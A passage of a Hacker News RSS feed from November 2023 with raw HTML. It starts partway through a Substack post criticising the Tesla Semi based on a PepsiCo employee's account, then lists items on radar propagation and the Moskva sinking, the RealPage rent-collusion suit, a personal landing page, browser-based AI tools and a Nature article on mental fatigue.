https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffc0018bd-c32f-48da-a858-835f30a7b477_1425x805.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffc0018bd-c32f-48da-a858-835f30a7b477_1425x805.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffc0018bd-c32f-48da-a858-835f30a7b477_1425x805.jpeg 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8a3c275a-7cd5-4624-b1b1-5e169e9f5877_1380x716.jpeg" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8a3c275a-7cd5-4624-b1b1-5e169e9f5877_1380x716.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8a3c275a-7cd5-4624-b1b1-5e169e9f5877_1380x716.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8a3c275a-7cd5-4624-b1b1-5e169e9f5877_1380x716.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8a3c275a-7cd5-4624-b1b1-5e169e9f5877_1380x716.jpeg 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8a3c275a-7cd5-4624-b1b1-5e169e9f5877_1380x716.jpeg" width="1380" height="716" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/8a3c275a-7cd5-4624-b1b1-5e169e9f5877_1380x716.jpeg&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:716,&quot;width&quot;:1380,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:109033,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8a3c275a-7cd5-4624-b1b1-5e169e9f5877_1380x716.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8a3c275a-7cd5-4624-b1b1-5e169e9f5877_1380x716.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8a3c275a-7cd5-4624-b1b1-5e169e9f5877_1380x716.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8a3c275a-7cd5-4624-b1b1-5e169e9f5877_1380x716.jpeg 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><ul><li><p><strong>The PepsiCo employee said that the Tesla Semi is using “pouch” battery cells made in Nevada</strong><span> [</span><em>this is odd, as all cells made by Panasonic in Nevada are cylindrical cells, but Tesla could be importing these pouches from overseas and packaging them at their Nevada plant. Pouches are lighter than cylindrical cells, so better to be used for the Semi</em><span>]</span></p></li><li><p><strong>The Tesla Semi’s pouch-style battery pack appears to be problematic, as they were easily damaged during a spate of heavy rain showers in California this year</strong><span>. </span></p></li><li><p><strong>All Tesla Semis and other electric trucks are subsidized by California state and the Megacharger station alone cost around $6 million</strong><span> [</span><em>these mega chargers can power up to 28,000 homes</em><span>].&nbsp; </span></p></li><li><p><strong>During the installation process, the Megachargers took down the power grid for a good chunk of the city</strong><span> [</span><em>imagine what happens when 100% of ICE vehicles have switched over to BEV in California by 2035</em><span>]. </span></p></li><li><p><strong>Tesla isn’t using special-grade truck parts for the Tesla Semi</strong><span> (i.e. weight and energy-grade heavy-duty parts).&nbsp; </span><strong>Tesla is using car parts on the Semi, which is why it breaks down so often given the range at which PepsiCo is driving its fleet</strong><span>.  </span></p></li><li><p><strong>There is a team of Tesla engineers on call 24 hours a day, ready to fly out and fix anything wrong with the Tesla Semis. No one at PepsiCo is allowed to fix the Semi</strong><span>.&nbsp; </span></p></li><li><p><strong>Tesla is using a double wishbone suspension on the Semi which the PepsiCo employee said makes zero sense and shows how Tesla simply threw car parts—not heavy-duty truck parts—into the Tesla Semi</strong><span>.&nbsp; </span></p></li><li><p><strong>Center seating, which looks cool in the Tesla Semi launch video, is actually not practical and not well liked by PepsiCo’s drivers</strong><span>.</span></p></li><li><p><strong>There is no consideration for battery longevity, which is another reason why the batteries keep dying and Tesla Semis need to be towed away</strong><span> [</span><em>the Megachargers used for the Semi release 750 kW and only require 50 minutes for a 400-mile charge; that’s a ton of energy that will wear the batteries out quickly, but cost isn’t a consideration it appears; just performance</em><span>]. &nbsp; </span></p></li><li><p><strong>None of the Tesla Semi drivers care about the fact that the Semi can accelerate to 60 mph (96 kph) in 20 seconds. People commenting on the Tesla Semi say it might help in passing other trucks, but PepsiCo’s employee said nobody cared</strong><span> [</span><em>Tesla uses the the tri-motor system from the Models S/X Plaid on one axle of the Semi, which seems both dangerous and needless, given the lack of concern among Semi users for quick acceleration</em><span>].</span></p></li><li><p><strong>Pepsi is “all in” on the Tesla Semi despite all the problems </strong><span>[</span><em>this is no surprise, given that California taxpayers are paying for all of the absurd costs of this project</em><span>].</span></p></li></ul><p>All of the above tidbits on the Tesla Semi from inside PepsiCo make sense and some of it was speculated over by Jason Fenske, the brilliant man behind the YouTube channel, “Engineering Explained”. </p><p><span>Specifically, he said that the 500-mile test drive of the Semi was suspect, as the size of the battery pack couldn’t support a drive that long at 60 miles per hour (96 kph) of constant speed. He showed that the Tesla-filmed test drive of the Semi revealed that the Semi’s odometer was only at 60 mph for 15% of the haul (full video </span><a href="https://www.youtube.com/watch?v=hvg_i0GE0Vo&amp;ab_channel=EngineeringExplained" rel="">here</a><span>).  </span></p><p>Why is PepsiCo going to all this trouble to use such ineffective vehicles to transport their products? Because they need all the ESG points they can get by using electric vehicles (they also use Volvos, Fords &amp; others) to transport the poison they peddle: PepsiCo’s food and beverage products are a major cause of the rising obesity problems in the US. The image below is roughly half of PepsiCo’s top products (full disclosure: I love many of them, but stopped eating them years ago).  </p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd9f97694-2d65-40c9-be26-032da5bf3122_1035x835.jpeg" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd9f97694-2d65-40c9-be26-032da5bf3122_1035x835.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd9f97694-2d65-40c9-be26-032da5bf3122_1035x835.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd9f97694-2d65-40c9-be26-032da5bf3122_1035x835.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd9f97694-2d65-40c9-be26-032da5bf3122_1035x835.jpeg 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd9f97694-2d65-40c9-be26-032da5bf3122_1035x835.jpeg" width="1035" height="835" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/d9f97694-2d65-40c9-be26-032da5bf3122_1035x835.jpeg&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:835,&quot;width&quot;:1035,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:93895,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd9f97694-2d65-40c9-be26-032da5bf3122_1035x835.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd9f97694-2d65-40c9-be26-032da5bf3122_1035x835.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd9f97694-2d65-40c9-be26-032da5bf3122_1035x835.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd9f97694-2d65-40c9-be26-032da5bf3122_1035x835.jpeg 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>Why is Tesla screwing around with the Semi despite it not being a viable product and Tesla having more pressing needs with other new models? Because Elon needed a pump for Tesla’s stock back in 2017. Keep in mind that Tesla was close to bankruptcy due to troubles with the Model 3 launch between 2017 to 2019, but Elon Musk’s own admission. </p><p>And Musk recently said in June that the Semi won’t see higher-volume production until late 2024 “due to battery supply constraints”. This was a blatant lie. Recent earnings calls at Panasonic and LG Energy Solutions revealed that the two battery cell makers are seeing excess capacity as their customers’ EV models are seeing a slowdown in sales (Tesla Models S/X) and others are pushing out their EV capex to 2025 (Ford and GM). </p><p>The Semi was simply another pump that never came to fruition, somewhat like battery pack swapping back in 2014 at Tesla. It would be no surprise to see the Tesla Semi discontinued or simply not mentioned anymore after 2024 unless battery packs become as cheap as ICE vehicle engines. For now, I believe it’s safe to say that electric Semis are a joke. And Elon Musk is the master joker.   </p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5ad98fbb-b205-4407-86ff-9d2c65bd308f_1015x931.jpeg" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5ad98fbb-b205-4407-86ff-9d2c65bd308f_1015x931.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5ad98fbb-b205-4407-86ff-9d2c65bd308f_1015x931.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5ad98fbb-b205-4407-86ff-9d2c65bd308f_1015x931.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5ad98fbb-b205-4407-86ff-9d2c65bd308f_1015x931.jpeg 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5ad98fbb-b205-4407-86ff-9d2c65bd308f_1015x931.jpeg" width="1015" height="931" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/5ad98fbb-b205-4407-86ff-9d2c65bd308f_1015x931.jpeg&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:931,&quot;width&quot;:1015,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:118310,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5ad98fbb-b205-4407-86ff-9d2c65bd308f_1015x931.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5ad98fbb-b205-4407-86ff-9d2c65bd308f_1015x931.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5ad98fbb-b205-4407-86ff-9d2c65bd308f_1015x931.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5ad98fbb-b205-4407-86ff-9d2c65bd308f_1015x931.jpeg 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p><em>Nothing in this report is investment advice. The Tesla Semi is a small part of Tesla’s overall costs. </em></p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Anomalous propagation and the sinking of the Russian warship Moskva (124 pts)]]></title>
            <link>https://journals.ametsoc.org/view/journals/bams/aop/BAMS-D-23-0113.1/BAMS-D-23-0113.1.xml</link>
            <guid>38297349</guid>
            <pubDate>Thu, 16 Nov 2023 23:51:31 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://journals.ametsoc.org/view/journals/bams/aop/BAMS-D-23-0113.1/BAMS-D-23-0113.1.xml">https://journals.ametsoc.org/view/journals/bams/aop/BAMS-D-23-0113.1/BAMS-D-23-0113.1.xml</a>, See on <a href="https://news.ycombinator.com/item?id=38297349">Hacker News</a></p>
<div id="readability-page-1" class="page"><section id="container-56968-item-56938"><h2 id="d25885642e184">Abstract</h2><p>On 13 April 2022, the Russian warship <em>Moskva</em> was hit by two Ukrainian <em>Neptune</em> anti-ship missiles in the Black Sea, leading to its demise. Before launching an anti-ship missile, a target must first be detected and positioned, for example by an accompanying radar system. However, when the missiles hit the <em>Moskva</em> she was well beyond the normal radar horizon of any ground-based radar system, making the ship undetectable under normal circumstances. Using meteorological reanalysis data, we show that at the time of the missile launch the prevailing weather conditions allowed a ground-based radar to detect targets far beyond the normal radar horizon through anomalous propagation conditions. During such conditions, the atmospheric index of refraction decreases rapidly with height, making electromagnetic radiation bend downward to, partly or fully, compensate the curvature of the Earth. The results show that atmospheric conditions must be considered carefully, even during warfare, as their impact on radar wave propagation can be considerable.</p></section></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Justice Dept Says Collusion Suit Against Apartment Owners Should Move Forward (266 pts)]]></title>
            <link>https://www.wsj.com/us-news/law/justice-department-clears-the-way-for-collusion-suit-against-apartment-owners-e545f260</link>
            <guid>38297203</guid>
            <pubDate>Thu, 16 Nov 2023 23:35:27 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.wsj.com/us-news/law/justice-department-clears-the-way-for-collusion-suit-against-apartment-owners-e545f260">https://www.wsj.com/us-news/law/justice-department-clears-the-way-for-collusion-suit-against-apartment-owners-e545f260</a>, See on <a href="https://news.ycombinator.com/item?id=38297203">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><div><p>Updated Nov. 16, 2023 6:27 pm ET</p></div><section><div data-type="image" data-inset_type="" data-sub_type="" data-layout="inline"><figure><picture><img alt="" sizes="(max-width: 639px) 100vw, (max-width: 979px) 620px, (max-width: 1299px) 540px, 700px" srcset="https://images.wsj.net/im-888279?width=540&amp;size=1.5005861664712778 540w, https://images.wsj.net/im-888279?width=620&amp;size=1.5005861664712778 620w, https://images.wsj.net/im-888279?width=639&amp;size=1.5005861664712778 639w, https://images.wsj.net/im-888279?width=700&amp;size=1.5005861664712778 700w, https://images.wsj.net/im-888279?width=700&amp;size=1.5005861664712778&amp;pixel_ratio=1.5 1050w, https://images.wsj.net/im-888279?width=700&amp;size=1.5005861664712778&amp;pixel_ratio=2 1400w, https://images.wsj.net/im-888279?width=700&amp;size=1.5005861664712778&amp;pixel_ratio=3 2100w" width="700" height="466" src="https://images.wsj.net/im-888279?width=700&amp;height=466"></picture></figure><figcaption><span>Tenants earlier this year filed a complaint in a Tennessee federal court alleging RealPage, and landlords that use its algorithmic pricing system to set rents, are violating antitrust laws.</span> <span><span>Photo: </span>Matt Rourke/Associated Press</span></figcaption></div><p data-type="paragraph">A lawsuit alleging that <a data-type="link" href="https://www.wsj.com/articles/thoma-bravo-agrees-to-buy-realpage-for-9-6-billion-11608526860" rel="">real-estate software company RealPage</a> illegally fixes rents at millions of apartments should go forward, the U.S. Justice Department said in a court filing.</p><p data-type="paragraph">Tenants earlier this year <a data-type="link" href="https://www.wsj.com/real-estate/commercial/thanks-to-big-data-landlords-know-how-to-squeeze-the-most-out-of-renters-eb7e5f02" rel="">filed a complaint</a> in a Tennessee federal court alleging RealPage and landlords that use its algorithmic pricing system to set rents are violating antitrust laws. The use of this pricing system has limited competition in the housing market and resulted in higher rents for tenants, the complaint alleges.&nbsp;</p></section><p>Copyright ©<!-- -->2023<!-- --> Dow Jones &amp; Company, Inc. All Rights Reserved. 87990cbe856818d5eddac44c7b1cdeb8</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: I made a silly personal landing page (134 pts)]]></title>
            <link>https://davidadler.pages.dev/</link>
            <guid>38295535</guid>
            <pubDate>Thu, 16 Nov 2023 21:06:19 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://davidadler.pages.dev/">https://davidadler.pages.dev/</a>, See on <a href="https://news.ycombinator.com/item?id=38295535">Hacker News</a></p>
<div id="readability-page-1" class="page">
    <div>
      
      <p><img src="https://davidadler.pages.dev/webp/0E9A9000.webp" alt="David Adler Face Eyes Follow Mouse" id="image" width="500">
      </p>

      <!-- Links -->
      <div>
        <!-- CV -->
        <p><a href="https://davidadler.pages.dev/cv.pdf" target="_blank">CV</a></p><!-- GitHub -->
        <p><a href="https://github.com/mfbx9da4" target="_blank">GitHub</a></p><!-- LinkedIn -->
        <p><a href="https://www.linkedin.com/in/david-adler-71056671/" target="_blank">LinkedIn</a></p><!-- StackOverflow -->
        <p><a href="https://stackoverflow.com/users/1376627/david-adler" target="_blank">StackOverflow</a></p><!-- Twitter -->
        <p><a href="https://twitter.com/da_adler" target="_blank">Twitter</a></p><!-- Instagram -->
        <p><a href="https://www.instagram.com/davidadlerfb/" target="_blank">Instagram</a></p><!-- Hacker News -->
        <p><a href="https://news.ycombinator.com/user?id=mfbx9da4" target="_blank">Hacker News</a>
      </p></div>
    </div>
    

    <!-- Cloudflare Web Analytics -->
    
    <!-- End Cloudflare Web Analytics -->
  

</div>]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: Tiny LLMs – Browser-based private AI models for a wide array of tasks (125 pts)]]></title>
            <link>https://tinyllms.vercel.app/dashboard</link>
            <guid>38295179</guid>
            <pubDate>Thu, 16 Nov 2023 20:43:34 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://tinyllms.vercel.app/dashboard">https://tinyllms.vercel.app/dashboard</a>, See on <a href="https://news.ycombinator.com/item?id=38295179">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><h2>Welcome to Tiny LLMs</h2><p>Powerful yet Compact: Browser-based AI models for a wide array of tasks, designed for optimal efficiency and user-friendliness, ensuring your privacy.</p><ul><li><a href="https://tinyllms.vercel.app/dashboard/asr"><p>Speech Recognition</p></a></li><li><a href="https://tinyllms.vercel.app/dashboard/tts"><p>Text to Speech</p></a></li><li><a href="https://tinyllms.vercel.app/dashboard/enhance"><p>Enhance Image</p></a></li><li><a href="https://tinyllms.vercel.app/dashboard/ocr"><p>Read Image</p></a></li><li><a href="https://www.shortsgenerator.com/play"><p>Text to Video</p></a></li></ul><h2>Other Tools</h2><ul><li><a target="_blank" rel="noopener noreferrer" href="https://vididoo.vercel.app/"><p>Media Converter</p></a></li><li><a target="_blank" rel="noopener noreferrer" href="https://tailblend.vercel.app/"><p>Photo Filter</p></a></li><li><a target="_blank" rel="noopener noreferrer" href="https://you-tldr.com/"><p>Youtube Summary</p></a></li></ul></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Why thinking hard makes us feel tired (168 pts)]]></title>
            <link>https://www.nature.com/articles/d41586-022-02161-5</link>
            <guid>38294723</guid>
            <pubDate>Thu, 16 Nov 2023 20:05:25 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.nature.com/articles/d41586-022-02161-5">https://www.nature.com/articles/d41586-022-02161-5</a>, See on <a href="https://news.ycombinator.com/item?id=38294723">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-container-type="article" data-component="article-container">
        

        
            
        
        
            
                <main>
                    <article data-track-component="news" lang="en">
                        
<div>
    <header>
        <div>
            <ul data-test="article-identifier">
                <li data-test="article-category"><span>NEWS</span></li>
                <li><time datetime="2022-08-11">11 August 2022</time></li>
                
            </ul>

            

            <div>
                
                <p>
                    Difficult tasks can lead to build-up of a signalling molecule in the brain, triggering fatigue.
                </p>
            </div>
        </div>
        
            <div>
                <ul data-test="authors-list" data-component-authors-activator="authors-list">
    
        
        <li><a data-test="author-name" data-track="click" data-track-label="view author info" href="#author-0" data-author-popup="author-0">
                Heidi Ledford</a></li>
    
</ul>


<div data-test="author-info">
    <ol>
        
            <li>
                
                    <span>Heidi Ledford</span>
                
                
                
                    <div id="author-0">
                            <div><p><a href="https://www.nature.com/search?author=Heidi+Ledford" data-track="click" data-track-action="author link - publication" data-track-label="link" rel="nofollow">View author publications</a></p></div>
                            <div>
                                <p>You can also search for this author in <span><a href="http://www.ncbi.nlm.nih.gov/entrez/query.fcgi?cmd=search&amp;term=Heidi+Ledford" data-track="click" data-track-action="author link - PubMed" data-track-label="link" rel="nofollow">PubMed</a>
                                    <span>&nbsp;</span><a href="https://scholar.google.co.uk/scholar?as_q=&amp;btnG=Search+Scholar&amp;as_sauthors=%22Heidi%2BLedford%22" data-track="click" data-track-action="author link - Google Scholar" data-track-label="link" rel="nofollow">Google Scholar</a>
                                    </span></p>
                            </div>
                       </div>
                
            </li>
        
    </ol>
</div>

            </div>
        
    </header>
    <div>
        <ul>
    <li>
        <a aria-label="Tweet this article" data-track="click" data-track-action="twitter" data-track-category="social" data-track-label="10.1038/d41586-022-02161-5" href="https://twitter.com/intent/tweet?text=Why+thinking+hard+makes+us+feel+tired&amp;url=https%3A%2F%2Fwww.nature.com%2Farticles%2Fd41586-022-02161-5">
            <span>Twitter</span>
            
        </a>
    </li>
    <li>
        <a aria-label="Facebook this article" data-track="click" data-track-action="facebook" data-track-category="social" data-track-label="10.1038/d41586-022-02161-5" href="http://www.facebook.com/sharer.php?u=https%3A%2F%2Fwww.nature.com%2Farticles%2Fd41586-022-02161-5">
            <span>Facebook</span>
            
        </a>
    </li>
    <li>
        <a aria-label="Email this article" data-track="click" data-track-action="email" data-track-category="social" data-track-label="10.1038/d41586-022-02161-5" href="mailto:?subject=Why%20thinking%20hard%20makes%20us%20feel%20tired&amp;body=https%3A%2F%2Fwww.nature.com%2Farticles%2Fd41586-022-02161-5">
            <span>Email</span>
            
        </a>
    </li>
</ul>

    </div>
</div>

            
        


        
            
                
                    


                    
                
            

            
                
                    
                    
                

                

                
                    <p>It’s not just in your head: a desire to curl up on the couch after a day spent toiling at the computer could be a physiological response to mentally demanding work, according to a study that links mental fatigue to changes in brain metabolism.</p>
                    <div>
                        <h2 id="access-options">Access options</h2>
                        

                        
                            
                                
                                


                                
    
    <section><div><p>Access Nature and 54 other Nature Portfolio journals</p><p>Get Nature+, our best-value online-access subscription</p><div><p id="nature-plus-subscription-price"><span>24,99&nbsp;€<span> /&nbsp;30&nbsp;days</span></span></p><p>cancel any time</p></div><div><p><a href="https://shop.nature.com/products/plus" data-track="click" data-track-action="nature+" data-track-label="link" data-track-category="article body"><span>Learn more</span></a></p></div></div><div><p>Subscribe to this journal</p><p>Receive 51 print issues and online access</p><p>We are sorry, but there is no personal subscription option available for your country.</p><div><p><a href="https://www.nature.com/nature/subscribe" data-track="click" data-track-action="more information" data-track-label="link" data-track-category="article body"><span>More Information</span></a></p></div></div><div><p>Rent or buy this article</p><p>Prices vary by article type</p><p id="readcube-price"><span>from</span>$1.95</p><p><span>to</span>$39.95</p><div><p><a href="https://www.nature.com/articles/d41586-022-02161-5.epdf?no_publisher_access=1&amp;r3_referer=nature" data-track="click" data-track-action="buy/rent now" data-track-label="link" data-track-category="article body"><span>Learn more</span></a></p></div></div><p>Prices may be subject to local taxes which are calculated during checkout</p></section>
  

    
    
        <nav>
    <h3>Additional access options:</h3>
    <ul>
        <li>
            <a href="https://idp.nature.com/authorize/natureuser?client_id=grover&amp;redirect_uri=https%3A%2F%2Fwww.nature.com%2Farticles%2Fd41586-022-02161-5" data-track="click" data-track-action="login" data-track-category="article body" data-track-label="link">Log in</a>
        </li>
        
        <li>
            <a href="https://www.springernature.com/gp/librarians/licensing/license-options" data-track="click" data-track-action="learn-subscription" data-track-category="article body" data-track-label="link">Learn about institutional subscriptions</a>
        </li>
        <li>
            <a href="https://support.nature.com/en/support/home" data-track="click" data-track-action="read our faqs" data-track-category="article body" data-track-label="link">Read our FAQs</a>
        </li>
        <li>
            <a href="https://www.springernature.com/gp/contact" data-track="click" data-track-action="contact customer support" data-track-category="article body" data-track-label="link">Contact customer support</a>
        </li>
    </ul>
</nav>
    

                            
                        
                    </div>
                
            
                <p><em>doi: https://doi.org/10.1038/d41586-022-02161-5</em></p>

            <div id="references" aria-labelledby="Bib1"><h2 id="Bib1">References</h2><div data-container-section="references" id="Bib1-content"><ol data-track-component="outbound reference"><li data-counter="1."><p id="ref-CR1">Wiehler, A., Branzoli, F., Adanyeguh, I., Mochel, F. &amp; Pessiglione, M. <i>Curr. Biol</i>. https://doi.org/10.1016/j.cub.2022.07.010 (2022).</p><p><a data-track="click" rel="nofollow noopener" data-track-label="10.1016/j.cub.2022.07.010" data-track-action="article reference" href="https://doi.org/10.1016%2Fj.cub.2022.07.010" aria-label="Article reference 1" data-doi="10.1016/j.cub.2022.07.010">Article</a>&nbsp;
    <a data-track="click" data-track-action="google scholar reference" data-track-label="link" rel="nofollow noopener" aria-label="Google Scholar reference 1" href="http://scholar.google.com/scholar_lookup?&amp;title=&amp;journal=Curr.%20Biol&amp;doi=10.1016%2Fj.cub.2022.07.010&amp;publication_year=2022&amp;author=Wiehler%2CA.&amp;author=Branzoli%2CF.&amp;author=Adanyeguh%2CI.&amp;author=Mochel%2CF.&amp;author=Pessiglione%2CM.">
                    Google Scholar</a>&nbsp;
                </p></li></ol><p><a data-track="click" data-track-action="download citation references" data-track-label="link" rel="nofollow" href="https://citation-needed.springer.com/v2/references/10.1038/d41586-022-02161-5?format=refman&amp;flavour=references">Download references</a></p></div></div>
            
                <div id="rights-link">
                    <p><a data-track="click" data-track-action="view rights and permissions" data-track-label="link" href="https://s100.copyright.com/AppDispatchServlet?title=Why%20thinking%20hard%20makes%20us%20feel%20tired&amp;author=Heidi%20Ledford&amp;contentID=10.1038%2Fd41586-022-02161-5&amp;copyright=Springer%20Nature%20Limited&amp;publication=0028-0836&amp;publicationDate=2022-08-11&amp;publisherName=SpringerNature&amp;orderBeanReset=true">Reprints and Permissions</a></p>
                </div>
            

            
